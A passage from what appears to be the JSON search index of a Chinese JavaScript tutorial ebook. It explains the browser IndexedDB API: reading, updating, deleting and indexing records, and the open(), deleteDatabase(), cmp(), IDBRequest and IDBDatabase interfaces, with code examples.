console.log('Name: ' + cursor.value.name);\n      console.log('Age: ' + cursor.value.age);\n      console.log('Email: ' + cursor.value.email);\n      cursor.continue();\n    } else {\n      console.log('\u6ca1\u6709\u66f4\u591a\u6570\u636e\u4e86\uff01');\n    }\n  };\n}\n\nreadAll();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u65b0\u5efa\u6307\u9488\u5bf9\u8c61\u7684<code>openCursor()</code>\u65b9\u6cd5\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u6240\u4ee5\u8981\u76d1\u542c<code>success</code>\u4e8b\u4ef6\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#26","title":"2.6 \u66f4\u65b0\u6570\u636e","text":"<p>\u66f4\u65b0\u6570\u636e\u8981\u4f7f\u7528<code>IDBObject.put()</code>\u65b9\u6cd5\u3002</p> <pre><code>function update() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .put({ id: 1, name: '\u674e\u56db', age: 35, email: 'lisi@example.com' });\n\n  request.onsuccess = function (event) {\n    console.log('\u6570\u636e\u66f4\u65b0\u6210\u529f');\n  };\n\n  request.onerror = function (event) {\n    console.log('\u6570\u636e\u66f4\u65b0\u5931\u8d25');\n  }\n}\n\nupdate();\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>put()</code>\u65b9\u6cd5\u81ea\u52a8\u66f4\u65b0\u4e86\u4e3b\u952e\u4e3a<code>1</code>\u7684\u8bb0\u5f55\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#27","title":"2.7 \u5220\u9664\u6570\u636e","text":"<p><code>IDBObjectStore.delete()</code>\u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u8bb0\u5f55\u3002</p> <pre><code>function remove() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .delete(1);\n\n  request.onsuccess = function (event) {\n    console.log('\u6570\u636e\u5220\u9664\u6210\u529f');\n  };\n}\n\nremove();\n</code></pre>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#28","title":"2.8 \u4f7f\u7528\u7d22\u5f15","text":"<p>\u7d22\u5f15\u7684\u610f\u4e49\u5728\u4e8e\uff0c\u53ef\u4ee5\u8ba9\u4f60\u641c\u7d22\u4efb\u610f\u5b57\u6bb5\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ece\u4efb\u610f\u5b57\u6bb5\u62ff\u5230\u6570\u636e\u8bb0\u5f55\u3002\u5982\u679c\u4e0d\u5efa\u7acb\u7d22\u5f15\uff0c\u9ed8\u8ba4\u53ea\u80fd\u641c\u7d22\u4e3b\u952e\uff08\u5373\u4ece\u4e3b\u952e\u53d6\u503c\uff09\u3002</p> <p>\u5047\u5b9a\u65b0\u5efa\u8868\u683c\u7684\u65f6\u5019\uff0c\u5bf9<code>name</code>\u5b57\u6bb5\u5efa\u7acb\u4e86\u7d22\u5f15\u3002</p> <pre><code>objectStore.createIndex('name', 'name', { unique: false });\n</code></pre> <p>\u73b0\u5728\uff0c\u5c31\u53ef\u4ee5\u4ece<code>name</code>\u627e\u5230\u5bf9\u5e94\u7684\u6570\u636e\u8bb0\u5f55\u4e86\u3002</p> <pre><code>var transaction = db.transaction(['person'], 'readonly');\nvar store = transaction.objectStore('person');\nvar index = store.index('name');\nvar request = index.get('\u674e\u56db');\n\nrequest.onsuccess = function (e) {\n  var result = e.target.result;\n  if (result) {\n    // ...\n  } else {\n    // ...\n  }\n}\n</code></pre>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#3indexeddb-api","title":"3\u3001indexedDB \u5bf9\u8c61 API","text":""},{"location":"ebook-JS-basic/10-4-IndexedDB/#indexeddbopen","title":"indexedDB.open()","text":"<p><code>indexedDB.open()</code>\u65b9\u6cd5\u7528\u4e8e\u6253\u5f00\u6570\u636e\u5e93\u3002\u8fd9\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u4f46\u662f\u4f1a\u7acb\u523b\u8fd4\u56de\u4e00\u4e2a IDBOpenDBRequest \u5bf9\u8c61\u3002</p> <pre><code>var openRequest = window.indexedDB.open('test', 1);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u6253\u5f00\u4e00\u4e2a\u540d\u4e3a<code>test</code>\u3001\u7248\u672c\u4e3a<code>1</code>\u7684\u6570\u636e\u5e93\u3002\u5982\u679c\u8be5\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u65b0\u5efa\u8be5\u6570\u636e\u5e93\u3002</p> <p><code>open()</code>\u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u6570\u636e\u5e93\u540d\u79f0\uff0c\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\uff0c\u4e0d\u53ef\u7701\u7565\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6570\u636e\u5e93\u7248\u672c\uff0c\u662f\u4e00\u4e2a\u5927\u4e8e<code>0</code>\u7684\u6b63\u6574\u6570\uff08<code>0</code>\u5c06\u62a5\u9519\uff09\uff0c\u5982\u679c\u8be5\u53c2\u6570\u5927\u4e8e\u5f53\u524d\u7248\u672c\uff0c\u4f1a\u89e6\u53d1\u6570\u636e\u5e93\u5347\u7ea7\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u7701\u7565\uff0c\u5982\u679c\u6570\u636e\u5e93\u5df2\u5b58\u5728\uff0c\u5c06\u6253\u5f00\u5f53\u524d\u7248\u672c\u7684\u6570\u636e\u5e93\uff1b\u5982\u679c\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5c06\u521b\u5efa\u8be5\u7248\u672c\u7684\u6570\u636e\u5e93\uff0c\u9ed8\u8ba4\u7248\u672c\u4e3a<code>1</code>\u3002</p> <p>\u6253\u5f00\u6570\u636e\u5e93\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u901a\u8fc7\u5404\u79cd\u4e8b\u4ef6\u901a\u77e5\u5ba2\u6237\u7aef\u3002\u4e0b\u9762\u662f\u6709\u53ef\u80fd\u89e6\u53d1\u76844\u79cd\u4e8b\u4ef6\u3002</p> <ul> <li>success\uff1a\u6253\u5f00\u6210\u529f\u3002</li> <li>error\uff1a\u6253\u5f00\u5931\u8d25\u3002</li> <li>upgradeneeded\uff1a\u7b2c\u4e00\u6b21\u6253\u5f00\u8be5\u6570\u636e\u5e93\uff0c\u6216\u8005\u6570\u636e\u5e93\u7248\u672c\u53d1\u751f\u53d8\u5316\u3002</li> <li>blocked\uff1a\u4e0a\u4e00\u6b21\u7684\u6570\u636e\u5e93\u8fde\u63a5\u8fd8\u672a\u5173\u95ed\u3002</li> </ul> <p>\u7b2c\u4e00\u6b21\u6253\u5f00\u6570\u636e\u5e93\u65f6\uff0c\u4f1a\u5148\u89e6\u53d1<code>upgradeneeded</code>\u4e8b\u4ef6\uff0c\u7136\u540e\u89e6\u53d1<code>success</code>\u4e8b\u4ef6\u3002</p> <p>\u6839\u636e\u4e0d\u540c\u7684\u9700\u8981\uff0c\u5bf9\u4e0a\u97624\u79cd\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u3002</p> <pre><code>var openRequest = indexedDB.open('test', 1);\nvar db;\n\nopenRequest.onupgradeneeded = function (e) {\n  console.log('Upgrading...');\n}\n\nopenRequest.onsuccess = function (e) {\n  console.log('Success!');\n  db = openRequest.result;\n}\n\nopenRequest.onerror = function (e) {\n  console.log('Error');\n  console.log(e);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u6ce8\u610f\u3002\u9996\u5148\uff0c<code>open()</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u5bf9\u8c61\uff08IDBOpenDBRequest\uff09\uff0c\u76d1\u542c\u51fd\u6570\u5c31\u5b9a\u4e49\u5728\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002\u5176\u6b21\uff0c<code>success</code>\u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u4ece<code>openRequest.result</code>\u5c5e\u6027\u53ef\u4ee5\u62ff\u5230\u5df2\u7ecf\u6253\u5f00\u7684<code>IndexedDB</code>\u6570\u636e\u5e93\u5bf9\u8c61\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#indexeddbdeletedatabase","title":"indexedDB.deleteDatabase()","text":"<p><code>indexedDB.deleteDatabase()</code>\u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u53c2\u6570\u4e3a\u6570\u636e\u5e93\u7684\u540d\u5b57\u3002\u5b83\u4f1a\u7acb\u523b\u8fd4\u56de\u4e00\u4e2a<code>IDBOpenDBRequest</code>\u5bf9\u8c61\uff0c\u7136\u540e\u5bf9\u6570\u636e\u5e93\u6267\u884c\u5f02\u6b65\u5220\u9664\u3002\u5220\u9664\u64cd\u4f5c\u7684\u7ed3\u679c\u4f1a\u901a\u8fc7\u4e8b\u4ef6\u901a\u77e5\uff0c<code>IDBOpenDBRequest</code>\u5bf9\u8c61\u53ef\u4ee5\u76d1\u542c\u4ee5\u4e0b\u4e8b\u4ef6\u3002</p> <ul> <li><code>success</code>\uff1a\u5220\u9664\u6210\u529f</li> <li><code>error</code>\uff1a\u5220\u9664\u62a5\u9519</li> </ul> <pre><code>var DBDeleteRequest = window.indexedDB.deleteDatabase('demo');\n\nDBDeleteRequest.onerror = function (event) {\n  console.log('Error');\n};\n\nDBDeleteRequest.onsuccess = function (event) {\n  console.log('success');\n};\n</code></pre> <p>\u8c03\u7528<code>deleteDatabase()</code>\u65b9\u6cd5\u4ee5\u540e\uff0c\u5f53\u524d\u6570\u636e\u5e93\u7684\u5176\u4ed6\u5df2\u7ecf\u6253\u5f00\u7684\u8fde\u63a5\u90fd\u4f1a\u63a5\u6536\u5230<code>versionchange</code>\u4e8b\u4ef6\u3002</p> <p>\u6ce8\u610f\uff0c\u5220\u9664\u4e0d\u5b58\u5728\u7684\u6570\u636e\u5e93\u5e76\u4e0d\u4f1a\u62a5\u9519\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#indexeddbcmp","title":"indexedDB.cmp()","text":"<p><code>indexedDB.cmp()</code>\u65b9\u6cd5\u6bd4\u8f83\u4e24\u4e2a\u503c\u662f\u5426\u4e3a indexedDB \u7684\u76f8\u540c\u7684\u4e3b\u952e\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u6bd4\u8f83\u7684\u7ed3\u679c\uff1a<code>0</code>\u8868\u793a\u76f8\u540c\uff0c<code>1</code>\u8868\u793a\u7b2c\u4e00\u4e2a\u4e3b\u952e\u5927\u4e8e\u7b2c\u4e8c\u4e2a\u4e3b\u952e\uff0c<code>-1</code>\u8868\u793a\u7b2c\u4e00\u4e2a\u4e3b\u952e\u5c0f\u4e8e\u7b2c\u4e8c\u4e2a\u4e3b\u952e\u3002</p> <pre><code>window.indexedDB.cmp(1, 2) // -1\n</code></pre> <p>\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u80fd\u7528\u6765\u6bd4\u8f83\u4efb\u610f\u7684 JavaScript \u503c\u3002\u5982\u679c\u53c2\u6570\u662f\u5e03\u5c14\u503c\u6216\u5bf9\u8c61\uff0c\u5b83\u4f1a\u62a5\u9519\u3002</p> <pre><code>window.indexedDB.cmp(1, true) // \u62a5\u9519\nwindow.indexedDB.cmp({}, {}) // \u62a5\u9519\n</code></pre>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idbrequest","title":"IDBRequest \u5bf9\u8c61","text":"<p>IDBRequest \u5bf9\u8c61\u8868\u793a\u6253\u5f00\u7684\u6570\u636e\u5e93\u8fde\u63a5\uff0c<code>indexedDB.open()</code>\u65b9\u6cd5\u548c<code>indexedDB.deleteDatabase()</code>\u65b9\u6cd5\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u5bf9\u8c61\u3002\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u90fd\u662f\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5b8c\u6210\u7684\u3002</p> <p>\u8fd9\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u662f\u5f02\u6b65\u64cd\u4f5c\uff0c\u8981\u901a\u8fc7<code>readyState</code>\u5c5e\u6027\u5224\u65ad\u662f\u5426\u5b8c\u6210\uff0c\u5982\u679c\u4e3a<code>pending</code>\u5c31\u8868\u793a\u64cd\u4f5c\u6b63\u5728\u8fdb\u884c\uff0c\u5982\u679c\u4e3a<code>done</code>\u5c31\u8868\u793a\u64cd\u4f5c\u5b8c\u6210\uff0c\u53ef\u80fd\u6210\u529f\u4e5f\u53ef\u80fd\u5931\u8d25\u3002</p> <p>\u64cd\u4f5c\u5b8c\u6210\u4ee5\u540e\uff0c\u89e6\u53d1<code>success</code>\u4e8b\u4ef6\u6216<code>error</code>\u4e8b\u4ef6\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7<code>result</code>\u5c5e\u6027\u548c<code>error</code>\u5c5e\u6027\u62ff\u5230\u64cd\u4f5c\u7ed3\u679c\u3002\u5982\u679c\u5728<code>pending</code>\u9636\u6bb5\uff0c\u5c31\u53bb\u8bfb\u53d6\u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u662f\u4f1a\u62a5\u9519\u7684\u3002</p> <p>IDBRequest \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li><code>IDBRequest.readyState</code>\uff1a\u7b49\u4e8e<code>pending</code>\u8868\u793a\u64cd\u4f5c\u6b63\u5728\u8fdb\u884c\uff0c\u7b49\u4e8e<code>done</code>\u8868\u793a\u64cd\u4f5c\u6b63\u5728\u5b8c\u6210\u3002</li> <li><code>IDBRequest.result</code>\uff1a\u8fd4\u56de\u8bf7\u6c42\u7684\u7ed3\u679c\u3002\u5982\u679c\u8bf7\u6c42\u5931\u8d25\u3001\u7ed3\u679c\u4e0d\u53ef\u7528\uff0c\u8bfb\u53d6\u8be5\u5c5e\u6027\u4f1a\u62a5\u9519\u3002</li> <li><code>IDBRequest.error</code>\uff1a\u8bf7\u6c42\u5931\u8d25\u65f6\uff0c\u8fd4\u56de\u9519\u8bef\u5bf9\u8c61\u3002</li> <li><code>IDBRequest.source</code>\uff1a\u8fd4\u56de\u8bf7\u6c42\u7684\u6765\u6e90\uff08\u6bd4\u5982\u7d22\u5f15\u5bf9\u8c61\u6216 ObjectStore\uff09\u3002</li> <li><code>IDBRequest.transaction</code>\uff1a\u8fd4\u56de\u5f53\u524d\u8bf7\u6c42\u6b63\u5728\u8fdb\u884c\u7684\u4e8b\u52a1\uff0c\u5982\u679c\u4e0d\u5305\u542b\u4e8b\u52a1\uff0c\u8fd4\u56de<code>null</code>\u3002</li> <li><code>IDBRequest.onsuccess</code>\uff1a\u6307\u5b9a<code>success</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBRequest.onerror</code>\uff1a\u6307\u5b9a<code>error</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002</li> </ul> <p>IDBOpenDBRequest \u5bf9\u8c61\u7ee7\u627f\u4e86 IDBRequest \u5bf9\u8c61\uff0c\u63d0\u4f9b\u4e86\u4e24\u4e2a\u989d\u5916\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027\u3002</p> <ul> <li><code>IDBOpenDBRequest.onblocked</code>\uff1a\u6307\u5b9a<code>blocked</code>\u4e8b\u4ef6\uff08<code>upgradeneeded</code>\u4e8b\u4ef6\u89e6\u53d1\u65f6\uff0c\u6570\u636e\u5e93\u4ecd\u7136\u5728\u4f7f\u7528\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBOpenDBRequest.onupgradeneeded</code>\uff1a<code>upgradeneeded</code>\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002</li> </ul>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idbdatabase","title":"IDBDatabase \u5bf9\u8c61","text":"<p>\u6253\u5f00\u6570\u636e\u6210\u529f\u4ee5\u540e\uff0c\u53ef\u4ee5\u4ece<code>IDBOpenDBRequest</code>\u5bf9\u8c61\u7684<code>result</code>\u5c5e\u6027\u4e0a\u9762\uff0c\u62ff\u5230\u4e00\u4e2a<code>IDBDatabase</code>\u5bf9\u8c61\uff0c\u5b83\u8868\u793a\u8fde\u63a5\u7684\u6570\u636e\u5e93\u3002\u540e\u9762\u5bf9\u6570\u636e\u5e93\u7684\u64cd\u4f5c\uff0c\u90fd\u901a\u8fc7\u8fd9\u4e2a\u5bf9\u8c61\u5b8c\u6210\u3002</p> <pre><code>var db;\nvar DBOpenRequest = window.indexedDB.open('demo', 1);\n\nDBOpenRequest.onerror = function (event) {\n  console.log('Error');\n};\n\nDBOpenRequest.onsuccess = function(event) {\n  db = DBOpenRequest.result;\n  // ...\n};\n</code></pre> <p>IDBDatabase \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li><code>IDBDatabase.name</code>\uff1a\u5b57\u7b26\u4e32\uff0c\u6570\u636e\u5e93\u540d\u79f0\u3002</li> <li><code>IDBDatabase.version</code>\uff1a\u6574\u6570\uff0c\u6570\u636e\u5e93\u7248\u672c\u3002\u6570\u636e\u5e93\u7b2c\u4e00\u6b21\u521b\u5efa\u65f6\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002</li> <li><code>IDBDatabase.objectStoreNames</code>\uff1aDOMStringList \u5bf9\u8c61\uff08\u5b57\u7b26\u4e32\u7684\u96c6\u5408\uff09\uff0c\u5305\u542b\u5f53\u524d\u6570\u636e\u7684\u6240\u6709 object store \u7684\u540d\u5b57\u3002</li> <li><code>IDBDatabase.onabort</code>\uff1a\u6307\u5b9a abort \u4e8b\u4ef6\uff08\u4e8b\u52a1\u4e2d\u6b62\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBDatabase.onclose</code>\uff1a\u6307\u5b9a close \u4e8b\u4ef6\uff08\u6570\u636e\u5e93\u610f\u5916\u5173\u95ed\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBDatabase.onerror</code>\uff1a\u6307\u5b9a error \u4e8b\u4ef6\uff08\u8bbf\u95ee\u6570\u636e\u5e93\u5931\u8d25\uff09\u7684\u76d1\u542c\u51fd\u6570\u3002</li> <li><code>IDBDatabase.onversionchange</code>\uff1a\u6570\u636e\u5e93\u7248\u672c\u53d8\u5316\u65f6\u89e6\u53d1\uff08\u53d1\u751f<code>upgradeneeded</code>\u4e8b\u4ef6\uff0c\u6216\u8c03\u7528<code>indexedDB.deleteDatabase()</code>\uff09\u3002</li> </ul> <p>\u4e0b\u9762\u662f<code>objectStoreNames</code>\u5c5e\u6027\u7684\u4f8b\u5b50\u3002\u8be5\u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a DOMStringList \u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u5f53\u524d\u6570\u636e\u5e93\u6240\u6709\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u79f0\uff08\u5373\u8868\u540d\uff09\uff0c\u53ef\u4ee5\u4f7f\u7528 DOMStringList \u5bf9\u8c61\u7684<code>contains</code>\u65b9\u6cd5\uff0c\u68c0\u67e5\u6570\u636e\u5e93\u662f\u5426\u5305\u542b\u67d0\u4e2a\u5bf9\u8c61\u4ed3\u5e93\u3002</p> <pre><code>if (!db.objectStoreNames.contains('firstOS')) {\n  db.createObjectStore('firstOS');\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5148\u5224\u65ad\u67d0\u4e2a\u5bf9\u8c61\u4ed3\u5e93\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5c31\u521b\u5efa\u8be5\u5bf9\u8c61\u4ed3\u5e93\u3002</p> <p>IDBDatabase \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002</p> <ul> <li><code>IDBDatabase.close()</code>\uff1a\u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\uff0c\u5b9e\u9645\u4f1a\u7b49\u6240\u6709\u4e8b\u52a1\u5b8c\u6210\u540e\u518d\u5173\u95ed\u3002</li> <li><code>IDBDatabase.createObjectStore()</code>\uff1a\u521b\u5efa\u5b58\u653e\u6570\u636e\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u7c7b\u4f3c\u4e8e\u4f20\u7edf\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u8868\u683c\uff0c\u8fd4\u56de\u4e00\u4e2a IDBObjectStore \u5bf9\u8c61\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728<code>versionchange</code>\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u8c03\u7528\u3002</li> <li><code>IDBDatabase.deleteObjectStore()</code>\uff1a\u5220\u9664\u6307\u5b9a\u7684\u5bf9\u8c61\u4ed3\u5e93\u3002\u8be5\u65b9\u6cd5\u53ea\u80fd\u5728<code>versionchange</code>\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u4e2d\u8c03\u7528\u3002</li> <li><code>IDBDatabase.transaction()</code>\uff1a\u8fd4\u56de\u4e00\u4e2a IDBTransaction \u4e8b\u52a1\u5bf9\u8c61\u3002</li> </ul> <p>\u4e0b\u9762\u662f<code>createObjectStore()</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\u3002</p> <pre><code>var request = window.indexedDB.open('demo', 2);\n\nrequest.onupgradeneeded = function (event) {\n  var db = event.target.result;\n\n  db.onerror = function(event) {\n    console.log('error');\n  };\n\n  var objectStore = db.createObjectStore('items');\n\n  // ...\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a\u540d\u4e3a<code>items</code>\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u5982\u679c\u8be5\u5bf9\u8c61\u4ed3\u5e93\u5df2\u7ecf\u5b58\u5728\uff0c\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002\u4e3a\u4e86\u907f\u514d\u51fa\u9519\uff0c\u9700\u8981\u7528\u5230\u4e0b\u6587\u7684<code>objectStoreNames</code>\u5c5e\u6027\uff0c\u68c0\u67e5\u5df2\u6709\u54ea\u4e9b\u5bf9\u8c61\u4ed3\u5e93\u3002</p> <p><code>createObjectStore()</code>\u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u5bf9\u8c61\u53c2\u6570\uff0c\u7528\u6765\u8bbe\u7f6e\u5bf9\u8c61\u4ed3\u5e93\u7684\u5c5e\u6027\u3002</p> <pre><code>db.createObjectStore('test', { keyPath: 'email' });\ndb.createObjectStore('test2', { autoIncrement: true });\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>keyPath</code>\u5c5e\u6027\u8868\u793a\u4e3b\u952e\uff08\u7531\u4e8e\u4e3b\u952e\u7684\u503c\u4e0d\u80fd\u91cd\u590d\uff0c\u6240\u4ee5\u4e0a\u4f8b\u5b58\u5165\u4e4b\u524d\uff0c\u5fc5\u987b\u4fdd\u8bc1\u6570\u636e\u7684<code>email</code>\u5c5e\u6027\u503c\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a<code>null</code>\uff1b<code>autoIncrement</code>\u5c5e\u6027\u8868\u793a\uff0c\u662f\u5426\u4f7f\u7528\u81ea\u52a8\u9012\u589e\u7684\u6574\u6570\u4f5c\u4e3a\u4e3b\u952e\uff08\u7b2c\u4e00\u4e2a\u6570\u636e\u8bb0\u5f55\u4e3a1\uff0c\u7b2c\u4e8c\u4e2a\u6570\u636e\u8bb0\u5f55\u4e3a2\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\uff0c\u9ed8\u8ba4\u4e3a<code>false</code>\u3002\u4e00\u822c\u6765\u8bf4\uff0c<code>keyPath</code>\u548c<code>autoIncrement</code>\u5c5e\u6027\u53ea\u8981\u4f7f\u7528\u4e00\u4e2a\u5c31\u591f\u4e86\uff0c\u5982\u679c\u4e24\u4e2a\u540c\u65f6\u4f7f\u7528\uff0c\u8868\u793a\u4e3b\u952e\u4e3a\u9012\u589e\u7684\u6574\u6570\uff0c\u4e14\u5bf9\u8c61\u4e0d\u5f97\u7f3a\u5c11<code>keyPath</code>\u6307\u5b9a\u7684\u5c5e\u6027\u3002</p> <p>\u4e0b\u9762\u662f<code>deleteObjectStore()</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\u3002</p> <pre><code>var dbName = 'sampleDB';\nvar dbVersion = 2;\nvar request = indexedDB.open(dbName, dbVersion);\n\nrequest.onupgradeneeded = function(e) {\n  var db = request.result;\n  if (e.oldVersion &lt; 1) {\n    db.createObjectStore('store1');\n  }\n\n  if (e.oldVersion &lt; 2) {\n    db.deleteObjectStore('store1');\n    db.createObjectStore('store2');\n  }\n\n  // ...\n};\n</code></pre> <p>\u4e0b\u9762\u662f<code>transaction()</code>\u65b9\u6cd5\u7684\u4f8b\u5b50\uff0c\u8be5\u65b9\u6cd5\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\u4e8b\u52a1\uff0c\u8fd4\u56de\u4e00\u4e2a IDBTransaction \u5bf9\u8c61\u3002\u5411\u6570\u636e\u5e93\u6dfb\u52a0\u6570\u636e\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u521b\u5efa\u6570\u636e\u5e93\u4e8b\u52a1\u3002</p> <pre><code>var t = db.transaction(['items'], 'readwrite');\n</code></pre> <p><code>transaction()</code>\u65b9\u6cd5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u91cc\u9762\u662f\u6240\u6d89\u53ca\u7684\u5bf9\u8c61\u4ed3\u5e93\uff0c\u901a\u5e38\u662f\u53ea\u6709\u4e00\u4e2a\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u8868\u793a\u64cd\u4f5c\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u3002\u76ee\u524d\uff0c\u64cd\u4f5c\u7c7b\u578b\u53ea\u6709\u4e24\u79cd\uff1a<code>readonly</code>\uff08\u53ea\u8bfb\uff09\u548c<code>readwrite</code>\uff08\u8bfb\u5199\uff09\u3002\u6dfb\u52a0\u6570\u636e\u4f7f\u7528<code>readwrite</code>\uff0c\u8bfb\u53d6\u6570\u636e\u4f7f\u7528<code>readonly</code>\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u7701\u7565\u65f6\u9ed8\u8ba4\u4e3a<code>readonly</code>\u6a21\u5f0f\u3002</p>"},{"location":"ebook-JS-basic/10-4-IndexedDB/#idb-object-store","title":"IDB Object Store \u5bf9\u8c61","text":"<p>IDBObjectStore \u5bf9\u8c61\u5bf9\u5e94\u4e00\u4e2a\u5bf9\u8c61\u4ed3\u5e93\uff08object store\uff09\u3002<code>IDBDatabase.createObjectStore()</code>\u65b9\u6cd5\u8fd4\u56de\u7684\u5c31\u662f\u4e00\u4e2a IDBObjectStore \u5bf9\u8c61\u3002</p> <p>IDBDatabase \u5bf9\u8c61\u7684<code>transaction()</code>\u8fd4\u56de\u4e00\u4e2a\u4e8b\u52a1\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684<code>objectStore()</code>\u65b9\u6cd5\u8fd4\u56de IDBObjectStore \u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u91c7\u7528\u4e0b\u9762\u7684\u94fe\u5f0f\u5199\u6cd5\u3002</p> <pre><code>db.transaction(['test'], 'readonly')\n  .objectStore('test')\n  .get(X)\n  .onsuccess = function (e) {}\n</code></pre> <p>IDBObjectStore \u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002</p> <ul> <li><code>IDBObjectStore.indexNames</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08DOMStringList\uff09\uff0c\u5305\u542b\u4e86\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u6240\u6709\u7d22\u5f15\u3002</li> <li><code>IDBObjectStore.keyPath</code>\uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u4e3b\u952e\u3002</li> <li><code>IDBObjectStore.name</code>\uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u7684\u540d\u79f0\u3002</li> <li><code>IDBObjectStore.transaction</code>\uff1a\u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u4ed3\u5e93\u6240\u5c5e\u7684\u4e8b\u52a1\u5bf9\u8c61\u3002</li> <li><code>IDBObjectStore.autoIncrement</code>\uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e3b\u952e\u662f\u5426\u4f1a\u81ea\u52a8\u9012\u589e\u3002</li> </ul> <p>IDBObjectStore \u5bf9\u8c61\u6709\u4ee5\u4e0b\u65b9\u6cd5\u3002</p> 